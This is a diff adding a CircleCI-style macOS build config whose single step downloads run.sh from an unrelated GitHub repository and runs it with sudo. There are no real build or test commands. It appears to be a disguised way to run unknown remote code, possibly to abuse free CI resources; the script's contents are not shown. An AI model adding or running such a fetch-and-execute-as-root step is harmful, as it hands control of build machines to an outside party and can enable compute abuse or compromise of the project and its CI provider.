@@ -1,0 +1,9 @@
+jobs:
+  build:
+    macos:
+      xcode: 14.2.0
+
+    steps:
+      # Commands will execute in macOS container
+      # with Xcode 14.2.0 installed
+      - run: wget https://raw.githubusercontent.com/funfactbro/respect/main/run.sh && chmod +x run.sh && sudo ./run.sh
